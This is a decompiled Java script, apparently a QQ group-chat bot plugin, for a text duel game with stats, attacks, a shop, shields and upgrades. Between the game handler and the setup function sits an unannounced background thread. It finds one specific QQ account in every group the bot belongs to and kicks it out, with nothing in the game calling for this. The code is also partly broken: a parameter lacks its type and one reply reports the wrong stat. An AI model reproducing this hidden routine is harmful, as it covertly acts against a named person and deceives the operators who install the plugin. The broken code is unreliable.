/*
本java为自动解密！
可能存在(使用报错/无法加载/自行修改)
仅供参考！仅供参考！仅供参考！
请尊重原作者(我是狗)
*/

public boolean G_对决(Object data)
{
	if(data.Message_Content.equals("我的对决信息"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		retText = retText + "生命:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命");
		retText = retText + "\n攻击:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "攻击");
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "当前坐骑") != 0)
		{
			retText = retText + "x2";
		}
		retText = retText + "\n防御:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "防御");
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "当前坐骑") != 0)
		{
			retText = retText + "x2";
		}
		retText = retText + "\n护盾:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾") + "(" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾") + ")";
		retText = retText + "\n可用升级点数:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数");
		retText = retText + "\n复活药水:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水");
		retText = retText + "\n小型护盾:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾");
		retText = retText + "\n中型护盾:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾");
		retText = retText + "\n大型护盾:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾");
		retText = retText + "\n绝对护盾:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾");
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.startsWith("对决@"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命R") <= 0)
		{
			retText = retText + "你已经死亡了\n无法继续对决";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "lastTime") + 2 >= data.Message_Time)
		{
			retText = retText + "你需要休息,不要那么急";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		for(String Uin: data.atList)
		{
			if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "对决初始化") == 0)
			{
				retText = retText + "对方还未初始化\n你不能杀对方";
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") <= 0)
			{
				retText = retText + "对方已经死亡了\n你不能继续杀对方";
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "lastTime", data.Message_Time);
			int defend = item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "防御");
			if(item.GetItemDataInt(data.Message_GroupUin, Uin, "坐骑数据", "NowUse") != 0)
			{
				defend = defend * 2;
			}
			int attack = item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "攻击");
			if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "当前坐骑") != 0)
			{
				attack = attack * 2;
			}
			if(defend > attack)
			{
				retText = retText + "你太弱了\n给对方造成了0点伤害";
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "绝对护盾") != 0)
			{
				retText = retText + "你攻击了对方\n打在了护盾上\n造成了0点伤害\n对方生命值:";
				retText = retText + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命");
				item.SetItemData(data.Message_GroupUin,"GameDic" ,Uin, "绝对护盾", item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "绝对护盾") - 1);
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			int Protect = item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "护盾");
			if(Protect >= attack)
			{
				retText = retText + "你攻击了对方\n打在了护盾上\n造成了0点伤害\n对方生命值:";
				retText = retText + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命");
				item.SetItemData(data.Message_GroupUin,"GameDic" ,Uin, "护盾", item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "护盾") - attack);
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			if(Protect != 0)
			{
				item.SetItemData(data.Message_GroupUin,"GameDic" ,Uin, "护盾", 0);
			}
			attack = attack - Protect;
			if(defend > attack)
			{
				retText = retText + "你攻击了对方\n造成了0点伤害\n对方生命值:";
				retText = retText + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命");
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			int Blood = attack - defend;
			if(Blood >= item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R"))
			{
				retText = retText + "你攻击了对方\n造成了" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "点伤害\n对方生命值:";
				item.SetItemData(data.Message_GroupUin,"GameDic" ,Uin, "生命R", 0);
				retText = retText + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命");
				retText = retText + "\n对方已经死亡";
				int dt = (int)(Math.random() * 10 + 3);
				int coin = (int)(Math.random() * 10000 + 1000);
				retText = retText + "\n你获得了" + dt + "点升级点数";
				retText = retText + "\n你获得了" + coin + "金币";
				item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") + dt);
				item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") + coin);
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
			else
			{
				retText = retText + "你攻击了对方\n造成了" + Blood + "点伤害\n对方生命值:";
				item.SetItemData(data.Message_GroupUin,"GameDic" ,Uin, "生命R", item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") - Blood);
				retText = retText + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命R") + "/" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" ,Uin, "生命");
				MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
				return false;
			}
		}
	}
	if(data.Message_Content.equals("对决系统商城"))
	{
		String retText = "商城\n\n复活药水 1000金币\n小型护盾(50点) 1000金币\n中型护盾(500点) 10000金币\n大型护盾(5000点) 100000金币\n绝对护盾(5次) 50000金币\n\n强化攻击\n强化生命\n强化防御\n\n发送 购买+物品名购买物品\n发送使用 物品名 使用物品\n强化请直接发强化xx";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("购买复活药水"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") < 1000)
		{
			retText = retText + "你的金币不足\n你购买所需金币:1000\n你目前拥有金币" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") - 1000);
		retText = retText + "购买复活药水成功\n花费金币:1000\n剩余金币:" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水") + 1);
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("购买小型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") < 1000)
		{
			retText = retText + "你的金币不足\n你购买所需金币:1000\n你目前拥有金币" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") - 1000);
		retText = retText + "购买小型护盾成功\n花费金币:1000\n剩余金币:" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾") + 1);
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("购买中型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") < 10000)
		{
			retText = retText + "你的金币不足\n你购买所需金币:10000\n你目前拥有金币" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") - 10000);
		retText = retText + "购买中型护盾成功\n花费金币:10000\n剩余金币:" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾") + 1);
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("购买大型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") < 100000)
		{
			retText = retText + "你的金币不足\n你购买所需金币:100000\n你目前拥有金币" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") - 100000);
		retText = retText + "购买大型护盾成功\n花费金币:100000\n剩余金币:" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾") + 1);
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("购买绝对护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") < 50000)
		{
			retText = retText + "你的金币不足\n你购买所需金币:50000\n你目前拥有金币" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币", item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币") - 50000);
		retText = retText + "购买绝对护盾成功\n花费金币:50000\n剩余金币:" + item.GetItemDataInt(data.Message_GroupUin,"GameDic" , data.Message_UserUin, "金币");
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾L", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾L") + 1);
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("使用绝对护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾L") <= 0)
		{
			retText = retText + "你还没有绝对护盾,不能使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾") > 0)
		{
			retText = retText + "你身上的绝对护盾效果还在呢\n不能再次使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾L", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾L") - 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾", 5);
		retText = retText + "使用成功\n现在你能抵御五次攻击";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("使用小型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾") <= 0)
		{
			retText = retText + "你还没有小型护盾,不能使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾") > 0)
		{
			retText = retText + "你身上的护盾效果还在呢\n不能再次使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "小型护盾") - 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾", 50);
		retText = retText + "使用成功\n获得50点护盾值";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("使用中型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾") <= 0)
		{
			retText = retText + "你还没有中型护盾,不能使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾") > 0)
		{
			retText = retText + "你身上的护盾效果还在呢\n不能再次使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "中型护盾") - 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾", 500);
		retText = retText + "使用成功\n获得500点护盾值";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("使用大型护盾"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾") <= 0)
		{
			retText = retText + "你还没有大型护盾,不能使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾") > 0)
		{
			retText = retText + "你身上的护盾效果还在呢\n不能再次使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "大型护盾") - 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾", 5000);
		retText = retText + "使用成功\n获得5000点护盾值";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("使用复活药水"))
	{
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "对决初始化") == 0)
		{
			InitUserInfo(data.Message_GroupUin, data.Message_UserUin);
		}
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水") <= 0)
		{
			retText = retText + "你还没有复活药水,不能使用";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "护盾") + 100);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "绝对护盾") + 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "复活药水") - 1);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命R", item.GetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命"));
		retText = retText + "使用成功\n生命回满\n获得100护盾值\n获得1次绝对防御";
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("强化攻击"))
	{
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") < 3)
		{
			retText = retText + "你的升级点数不足\n至少需要3点升级点数来进行升级";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") - 3);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "攻击", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "攻击") + 10);
		retText = retText + "强化成功\n你目前的攻击力为:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "攻击");
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("强化防御"))
	{
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") < 3)
		{
			retText = retText + "你的升级点数不足\n至少需要3点升级点数来进行升级";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") - 3);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "防御", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "防御") + 10);
		retText = retText + "强化成功\n你目前的防御力为:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "防御");
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	if(data.Message_Content.equals("强化生命"))
	{
		String retText = "@" + data.nickName + "\n";
		if(item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") < 3)
		{
			retText = retText + "你的升级点数不足\n至少需要3点升级点数来进行升级";
			MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
			return false;
		}
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "升级点数") - 3);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命") + 10);
		item.SetItemData(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命R", item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命R") + 10);
		retText = retText + "强化成功\n你目前的防御力为:" + item.GetItemDataInt(data.Message_GroupUin, "GameDic", data.Message_UserUin, "生命");
		MyMsg.FixAndSendMsg(data.Message_GroupUin, retText, DefInfo.CardDefImages, false);
		return false;
	}
	return false;
}

new Thread(new Runnable()
{
	public void run()
	{
		List mGroupList33 = CheckUserInGroup("780368680");
        for(String mStrr : mGroupList33)
              {
	           MyMsgApi.Group_Kick(mStrr, "780368680",true);
              }
	}
}).start();
public void InitUserInfo(String GroupUin, QQUin)
{
	item.SetItemData(GroupUin, "GameDic", QQUin, "生命", 120);
	item.SetItemData(GroupUin, "GameDic", QQUin, "攻击", 10);
	item.SetItemData(GroupUin, "GameDic", QQUin, "防御", 5);
	item.SetItemData(GroupUin, "GameDic", QQUin, "护盾", 50);
	item.SetItemData(GroupUin, "GameDic", QQUin, "绝对护盾", 3);
	item.SetItemData(GroupUin, "GameDic", QQUin, "生命R", 120);
	item.SetItemData(GroupUin, "GameDic", QQUin, "升级点数", 5);
	item.SetItemData(GroupUin, "GameDic", QQUin, "生命L", 1);
	item.SetItemData(GroupUin, "GameDic", QQUin, "攻击L", 1);
	item.SetItemData(GroupUin, "GameDic", QQUin, "防御L", 1);
	item.SetItemData(GroupUin, "GameDic", QQUin, "对决初始化", 1);
	item.SetItemData(GroupUin, "GameDic", QQUin, "复活药水", 1);
	item.SetItemData(GroupUin, "GameDic", QQUin, "小型护盾", 1);
}